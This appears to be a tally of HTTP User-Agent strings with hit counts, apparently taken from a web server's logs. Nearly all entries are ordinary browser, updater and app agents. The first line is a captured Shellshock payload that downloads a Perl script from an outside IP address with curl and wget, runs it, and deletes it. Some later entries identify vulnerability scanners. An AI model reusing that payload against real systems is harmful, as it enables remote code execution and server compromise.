1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://185.70.10.139/mk2;curl -O http://185.70.10.139/mk2;wget http://185.70.10.139/mk2;perl mk2;perl /tmp/mk2;rm -rf /tmp/mk2*"
19;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
19;Mozilla/4.0 (Windows 7 6.1) Java/1.8.0_66
19;Mozilla/5.0 (compatible; MSIE 5.01; Win2000)
19;unused/0 (hammerhead MMB29T); gzip
1956;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; BRI/2)
196;Mozilla/4.0 (compatible; MSIE 9.11.9600.18204; Windows NT 6.1)
197412;2gis/3.15.10.4952 (Windows 6.1 build 7601 NT Service Pack 1) e75bc49b-a6e1-40af-8020-d2685f89db46
2;__DownLoadWebFile__
2;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 24898dda-b275-4dea-b28a-10be83f7b9e5
2;Agent
2;Amigo Setup
2;AntiMalware Agent
2;avast! SimpleHTTP
2;DownloadFile
2;Dr.Web Light Version: 9.00.5.14004 Device model: W200 Firmware version: 4.2.1
2;EpsonRewardInvitation
2;Foxit Updater
2;Google Update/1.3.28.15;winhttp
2;Google Update/1.3.29.2;winhttp
2;Google Update/1.3.29.5;winhttp;cup-ecdsa
2;Googlebot/2.1
2;HelpSupportServices
2;Microsoft Data Access Internet Publishing Provider Protocol Discovery
2;Microsoft Office/11.0 (Windows NT 6.1; Microsoft Excel 11.0.8405; Pro)
2;Microsoft Office/11.0 (Windows NT 6.1; Microsoft Office Outlook 11.0.8172; Pro)
2;Microsoft Office/12.0 (Windows NT 5.1; Microsoft Office Excel 12.0.6607; Pro)
2;Microsoft(r) Windows(tm) FTP Folder
2;Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.3655)
2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; MSOffice 12)
2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.1; .NET CLR 2.0.50727)
2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; NP06; GWX:DOWNLOADED)
2;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; BRI/2; NP06)
2;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; IDCRL 10.6.3.9651.0; IDCRL-cfg 16.0.25710.0; App svchost.exe, 6.3.9651.0, {DF60E2DF-88AD-4526-AE21-83D130EF0F68})
2;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
2;Mozilla/4.0 (compatible; qip4301; QI; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
2;Mozilla/4.0 (compatible; qip4301; QSI10; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
2;Mozilla/4.0 (compatible; qip4301; QSI3; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
2;Mozilla/4.0 (compatible; qip4301; QSI7; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
2;Mozilla/4.0 (compatible; qip4983; QSI18; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI22; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI25; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI28; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI3; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI35; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI43; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI5; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; qip4983; QSI7; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
2;Mozilla/4.0 (compatible; Synapse)
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4
2;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko)
2;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.3539 Yowser/2.5 Safari/537.36
2;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36
2;Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0
2;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
2;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
2;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
2;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
2;Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6
2;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19
2;Mozilla/5.0 Project 25499 (project25499.com)
2;netscan.lekus.su
2;SCAgent
2;SonyEricssonPCCompanion
2;StatsInfo
2;submit-client/1.0
2;VEhMIFcyMDA7MTc7NC4yLjE7VEhMLUNOLTlCMThELVAxODhGMDRWMS4xLjE7MzUzNzQ2MDIxMDkzNzEyOzI1MDIwMzMxMjkyODU4MztudWxsOztudWxsO251bGw7O251bGw7bnVsbDtjb20ubW9iaWxldW5jbGUudG9vbGJveDozMjc6Y29tLm1vYmlsZXVuY2xlLnRvb2xib3guc2VydmljZS5Ub29sQm94U2VydmljZTsxO1RFTEUy
2;Yandex.Browser lite installer
2;Z3Vlc3Ntb2JpbGUjfCNUSEwtQ04tOUIxOEQtUDE4OEYwNFYxLjEuMQ==
20;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E; MSOffice 12)
20;Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)
20;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
20;SLSSoapClient
20;unused/0 (hammerhead MMB29U); gzip
2000;RemoteConfigFetcher
200007;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
20275;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
204;Mozilla/5.0 Jorgee
20632;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0
209;Mozilla/5.0 (ABE, https://noscript.net/abe/wan)
21;2gis/1.0.0.4910 (Windows 5.1 build 2600 NT Service Pack 3) 8bfbc53c-3363-4c85-bd5c-3e9ec42bf632
21;2gis/1.0.0.4910 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
21;2gis/1.0.0.4910 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
21;2gis/3.15.7.4910 (Windows 5.1 build 2600 NT Service Pack 3) 793d80f8-2746-464f-8aeb-e19627a7f8f5
21;Chrome Service 45.0.2454.101(3b3c00f2d95c45cca18ab944acced413fb759311-refs/branch-heads/2454@{#502}) Windows NT 5.1
21;Java/1.8.0_60
21;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
211;Mozilla/4.0 (compatible; ICS)
21168;Mozilla/5.0 (Windows NT 6.1; rv:44.0) Gecko/20100101 Firefox/44.0
214925;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
216;mbam - consumer_unknown (Manual) - base:2.2.0.1024 - rules:v2015.12.24.03 swissarmy:v2015.12.18.01 actions:v2015.12.15.02 domains:v2015.12.23.04 ips:v2015.12.21.01 akadomains:v2015.09.11.02 akaips:v2015.09.11.02
22;HP Rules Engine/2.0
22;User-Agent:Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
2202;Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0
22075;MRAICQ 8.1 (build 6347) 623305058 icq
2217;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
22267;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.82
2249;okhttp/2.5.0
2287;Shockwave Flash
229058;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
23;Agoo-sdk-uc-2.0
23;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
23;Mozilla/4.0 (compatible; qip4983; QSI2; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
231;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko
23297;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36 OPR/35.0.2066.68
233;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)
23483;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47
239;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
239;SeaPort/7.3
2401;Syncer/8.00 (unknown)
2426;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36
244;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 YaBrowser/15.10.2454.3865 Safari/537.36
24635;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
249;2gis/1.0.0.4952 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
249;Chrome WIN 48.0.2564.109 (dee993990fa912f87e4d1eb5822d408be4896ea5-refs/branch-heads/2564@{#684}) channel(stable)
249;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36
25;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
25;ru.ntv.client_v3.3.4
25;THL W200; MIUI/3.12.20
250280;Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0
252;Adobe Flash Player
254432;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
259;Download Flash Player Installer/1.0
26;Collector Network Agent/1.00
26;CPM-Perl
26;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML
266;Chrome WIN 48.0.2564.116 (700a0e589ecfa7e0f65cace17e2f75470c4adf9d-refs/branch-heads/2564@{#706}) channel(stable)
27;Mozilla/3.0 (compatible; Acrobat 5.0; Windows)
27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/537.86.3
270;avast! Emergency Update Agent
275;2gis/1.0.0.4952 (Windows 6.1 build 7601 NT Service Pack 1) e75bc49b-a6e1-40af-8020-d2685f89db46
27594;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
28;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.0
28;ut_core BenchHttp (ver:41162)
29;2gis/3.15.10.4952 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
29;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
29;Mozilla/5.0 (Windows NT 5.2; rv:38.0) Gecko/20100101 Firefox/38.0
29;Skype� 6.14
29;unused/0 (ASUS_T00F KVT49L); gzip
29183;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
293;Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
2948;okhttp/3.0.1
295;ut_core BenchHttp (ver:41865)
297184;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
3;APClient
3;ClipOrganizer
3;dsk
3;DXCoreServiceToken
3;DXStatisticAppInfo
3;Google Update/1.3.28.15;winhttp;cup-ecdsa
3;Java/1.8.0_66
3;libwww-perl/6.15
3;m2 note; 5.1; Flyme OS 4.5.4.2I; ru-ru
3;mailrutool
3;Morfeus Fucking Scanner
3;Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]
3;Mozilla/4.0 (compatible; MSIE 6.0; Win32)
3;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)
3;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
3;Mozilla/4.0 (compatible; qip4983; QSI11; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
3;Mozilla/4.0 (compatible; qip4983; QSI12; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
3;Mozilla/4.0 (compatible; qip4983; QSI17; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
3;Mozilla/4.0 (compatible; qip4983; QSI9; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
3;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
3;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.4.2403.3 Amigo/44.4.2403.3 MRCHROME SOC Safari/537.36
3;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:30.N) Gecko/20110302 Firefox/30.0
3;Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; NP06; rv:11.0) like Gecko
3;Mozilla/5.0 (Windows NT 6.3; rv:36.0 Gecko/20100101 Firefox/36.0
3;MpGears
3;MS Clearing House Default Agent
3;NSPlayer/11.0.5721.5251 WMFSDK/11.0
3;NSPlayer/9.00.00.4504
3;Opera autoupdate agent/1.1.9
3;Python-urllib/2.7
3;Skype� 7.5
30;Lavf/56.15.102
300983;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
303;Chrome WIN 47.0.2526.111 (88b253bb9dc57f80dc576f296dcf5e5df5cfb7b6-refs/branch-heads/2526@{#545}) channel(stable)
30385;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
30416;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25
306497;Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0
306509;GoogleEarth/6.2.1.6014(Windows;Microsoft Windows (5.1.2600.3);ru;kml:2.2;client:Free;type:default)
31;Le Roukin
31;UCWEB7.0.2.37/28/999
31172;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25 (Edition Yx)
314;client connection
3140;Mozilla/5.0 (Windows; N; Windows NT 5.1; ru-RU) AppleWebKit/532.4 (KHTML, like Gecko) Google Earth/6.2.1.6014 Safari/532.4
315;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; McAfee)
32;Google Update/1.3.29.1;winhttp
32;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2; Windows-Media-Player/12.0.7601.17514)
32;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)
3205;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24
33;Hewlet Packard eDiags
33;kh_lt/LT6.2.1.6014
33;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
3346;Post_Multipart
339;SeaPort/2.0
34;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:89a489a69475545cf53aea7c43dbb578)
34;NSIS_Inetc (Mozilla)
341;Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
3422;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92
359;MRAICQ 8.1 (build 6347) lu-exmar@yandex.ru icq
363;BTWebClient/3450(41865)
36340;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.0.6151 Safari/537.36
364;unused/0 (P188F04 JOP40D); gzip
366;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)
37;A/5.0.2/LGE/LG-D802/MSM8974/Tele2
37;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.7.0
37;okhttp/2.7.4
37;TouchPalv5 (g2 LRX22G)
378;WifiHotspot
3799;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36
38;Innova 4game Service/1.0
38;Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
38;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.7.0 Lightning/4.0.7
38602;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
39;Silverlight
39;whitelist-client/1.0
393;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20100922 Linux Mint/10 (Julia) Firefox/3.6.10
39824;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.3.0.6796 Yowser/2.5 Safari/537.36
